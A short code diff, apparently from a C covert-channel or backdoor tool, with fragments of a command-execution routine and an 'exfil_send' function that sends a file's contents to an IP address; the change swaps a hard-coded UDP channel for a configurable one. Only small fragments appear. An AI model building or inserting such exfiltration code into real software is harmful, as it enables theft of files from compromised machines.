@@ -187,7 +187,7 @@ void execute(char *command, u_int32_t ip, u_int16_t port)
 			dst_port = 9001;
 
 			usleep(SLEEP_TIME);
-			_send(ip, src_port, dst_port, CHAN_UDP);
+			_send(ip, src_port, dst_port, channel);
 		}
 		//			free(enc);
 	}
@@ -209,8 +209,6 @@ void exfil_send(uint32 ipaddr, char *path)
 	{
 		char *trans;
 		
-		//pbuf = buffer;
-
 		// Pad non-even sequences with a space ...
 		if (buflen % 2 != 0)
 		{
